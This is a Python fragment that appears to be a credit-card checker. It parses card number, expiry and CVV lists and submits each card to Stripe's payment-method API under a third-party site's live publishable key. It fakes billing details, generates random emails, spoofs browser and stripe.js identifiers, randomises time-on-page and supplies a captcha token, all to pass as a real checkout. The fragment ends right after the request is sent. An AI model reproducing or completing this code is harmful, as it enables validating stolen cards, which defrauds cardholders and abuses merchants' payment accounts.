def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{username}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

def get_stripe_pm(email, cc, mm, yy, cvv):
    guid = str(uuid4())
    muid = str(uuid4())
    sid = str(uuid4())
    phone = "(314)474-6658"
    data = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[name]": "John Doe",
        "billing_details[phone]": phone,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy[-2:],
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "payment_user_agent": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element",
        "referrer": "https://app.theruletool.com",
        "time_on_page": str(random.randint(10000, 99999)),
        "key": "pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA",
        # You must supply a valid hcaptcha token for real requests
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..EiL7C4ck57anNNbJufiXcmAwfrq4Vsd1vy92cGiflcg"
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "accept": "application/json"
    }
    resp = requests.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers, timeout=30)
